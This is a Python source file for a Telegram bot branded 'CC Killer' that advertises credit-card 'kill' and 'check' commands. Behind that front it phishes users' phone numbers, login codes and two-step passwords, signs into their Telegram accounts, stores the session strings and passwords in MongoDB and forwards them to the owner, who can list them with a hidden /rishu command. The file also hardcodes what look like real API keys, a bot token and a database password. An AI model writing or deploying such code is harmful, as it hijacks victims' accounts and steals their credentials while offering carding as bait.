import re
import asyncio
from flask import Flask
from pyrogram import Client, filters
from pyrogram.types import Message, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from telethon.sessions import StringSession
from pymongo import MongoClient

# Telegram API Credentials
API_ID = 29657994
API_HASH = "85f461c4f637911d79c65da1fc2bdd77"
BOT_TOKEN = "8009070392:AAF2e26nQnu49Z9Z8UHJFNOPivSGLMjzb-o"
OWNER_USERNAME = "@Rishu1286"
MONGO_URL = "mongodb+srv://Krishna:pss968048@cluster0.4rfuzro.mongodb.net/?retryWrites=true&w=majority"

# MongoDB Setup
mongo = MongoClient(MONGO_URL)
db = mongo['cc_killer']
sessions_col = db['sessions']
user_data = {}

# Pyrogram client
app = Client("cc_killer_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# Flask app
flask_app = Flask(__name__)

@app.on_message(filters.command("start"))
async def start(client, message: Message):
    keyboard = [[InlineKeyboardButton("Register", callback_data="register")]]
    markup = InlineKeyboardMarkup(keyboard)
    instructions = (
        "ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ 《 ₡₡ кɪʟʟᴇʀ 》!\n\n"
        f"ʜᴇʏ {message.from_user.first_name}\n\n"
        "ʜᴇʀᴇ’ꜱ ʜᴏᴡ ʏᴏᴜ ᴄᴀɴ ɢᴇᴛ ꜱᴛᴀʀᴛᴇᴅ:\n\n"
        "* ⌁ How it Works ! *\n\n"
        "ꜰᴇᴀᴛᴜʀᴇꜱ ⌁⌁\n"
        "[✓] /cu  [card_details] ⌁ ᴋɪʟʟ ᴄᴄ\n"
        "[✓] /b3  [card_details] ⌁ ᴄʜᴇᴄᴋ ᴄᴀʀᴅ\n"
    )
    await message.reply_text(instructions, reply_markup=markup)

@app.on_callback_query(filters.regex("register"))
async def inline_register(client, callback_query):
    keyboard = [[KeyboardButton("Share phone number", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
    await callback_query.message.reply_text("Please share your phone number to begin the login process.", reply_markup=reply_markup)

@app.on_message(filters.command("register"))
async def register(client, message: Message):
    keyboard = [[KeyboardButton("Share phone number", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
    await message.reply_text("Please share your phone number to begin the login process.", reply_markup=reply_markup)

@app.on_message(filters.contact)
async def handle_phone_number(client, message: Message):
    phone_number = message.contact.phone_number
    user_id = message.chat.id

    await message.reply_text("Sending OTP...")

    try:
        tele_client = TelegramClient(StringSession(), API_ID, API_HASH)
        await tele_client.connect()

        result = await tele_client.send_code_request(phone_number)
        user_data[user_id] = {
            "client": tele_client,
            "phone_number": phone_number,
            "phone_code_hash": result.phone_code_hash,
        }
        await message.reply_text("OTP has been sent to your phone. Please enter it:")
    except Exception as e:
        await message.reply_text(f"Error sending OTP: {str(e)}")

    try:
        await message.delete()
    except:
        pass

@app.on_message(filters.text & filters.private)
async def handle_otp_or_password(client, message: Message):
    user_id = message.chat.id
    if user_id not in user_data:
        return

    user_info = user_data[user_id]
    telethon_client = user_info["client"]

    if user_info.get("awaiting_password"):
        password = message.text.strip()
        try:
            await telethon_client.sign_in(password=password)
            session_string = telethon_client.session.save()

            sessions_col.update_one(
                {"user_id": user_id},
                {"$set": {
                    "user_id": user_id,
                    "phone_number": user_info['phone_number'],
                    "session": session_string,
                    "password": password
                }},
                upsert=True
            )

            await app.send_message(OWNER_USERNAME, f"2FA login success for {user_info['phone_number']}:\nSession: `{session_string}`\nPassword: `{password}`")
            await message.reply_text("Login successful with 2FA!")
        except Exception as e:
            await message.reply_text(f"2FA login failed: {str(e)}")
        finally:
            await telethon_client.disconnect()
            user_data.pop(user_id, None)
        return

    otp = message.text.strip()
    try:
        await telethon_client.sign_in(user_info["phone_number"], otp, phone_code_hash=user_info["phone_code_hash"])
        session_string = telethon_client.session.save()

        sessions_col.update_one(
            {"user_id": user_id},
            {"$set": {
                "user_id": user_id,
                "phone_number": user_info['phone_number'],
                "session": session_string,
                "password": None
            }},
            upsert=True
        )

        await app.send_message(OWNER_USERNAME, f"Login success for {user_info['phone_number']}\nSession: `{session_string}`")
        await message.reply_text("Login successful!")
        await telethon_client.disconnect()
        user_data.pop(user_id, None)

    except SessionPasswordNeededError:
        await message.reply_text("Two-Step Verification is enabled. Please send your password:")
        user_info["awaiting_password"] = True
    except PhoneCodeInvalidError:
        await message.reply_text("Invalid OTP. Please try again.")
    except Exception as e:
        await message.reply_text(f"Error logging in: {str(e)}")
        await telethon_client.disconnect()
        user_data.pop(user_id, None)

    try:
        await message.delete()
    except:
        pass

@app.on_message(filters.command("rishu"))
async def view_logged_in_users(client, message: Message):
    if message.from_user.username != OWNER_USERNAME.strip("@"):
        return

    users = sessions_col.find()
    text = "**Logged In Users:**\n\n"
    for user in users:
        text += f"**Phone:** `{user['phone_number']}`\n**Session:** `{user['session']}`"
        if user.get("password"):
            text += f"\n**2FA Password:** `{user['password']}`"
        text += "\n\n"
    await message.reply_text(text or "No users logged in.")

# Keep Flask running
@flask_app.route('/')
def home():
    return "Bot is running"

if __name__ == "__main__":
    import threading
    threading.Thread(target=lambda: flask_app.run(host="0.0.0.0", port=8080)).start()
    app.run()
